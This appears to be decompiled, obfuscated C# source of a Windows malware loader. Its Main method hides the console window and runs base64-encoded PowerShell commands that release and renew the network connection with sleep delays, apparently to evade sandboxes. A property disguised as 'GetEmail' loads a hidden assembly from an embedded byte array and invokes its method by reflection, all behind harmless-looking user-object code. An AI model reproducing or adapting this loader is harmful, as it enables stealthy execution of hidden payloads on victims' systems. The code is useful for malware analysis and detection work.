using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using ns1;
using ns10;
using ns3;

namespace ns0;

internal static class Class0
{
	private static string GetEmail
	{
		get
		{
			Class4.smethod_600("-enc aQBwAGMAbwBuAGYAaQBnACAALwByAGUAbgBlAHcA");
			Class4.smethod_600("-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAuADUA");
			Assembly assembly = (Assembly)typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) })!.Invoke(null, new object[1] { Class4.smethod_545(Class3.Qiwwzeklojyvudwfgefymv) });
			Type[] exportedTypes = assembly.GetExportedTypes();
			Type[] array = exportedTypes;
			foreach (Type type in array)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "Utylfn")
					{
						return (string)methodInfo.Invoke(null, null);
					}
				}
			}
			return "";
		}
	}

	[STAThread]
	public static void Main()
	{
		Class4.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
		Class4.smethod_600("-enc aQBwAGMAbwBuAGYAaQBnACAALwByAGUAbABlAGEAcwBlAA==");
		Class4.smethod_600("-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgA1AA==");
		Class1 object_ = new Class1
		{
			Email = GetEmail,
			Active = true,
			Roles = new List<string> { "User", "Admin" }
		};
		string value = Class8.smethod_16(object_);
		Console.WriteLine(value);
	}
}
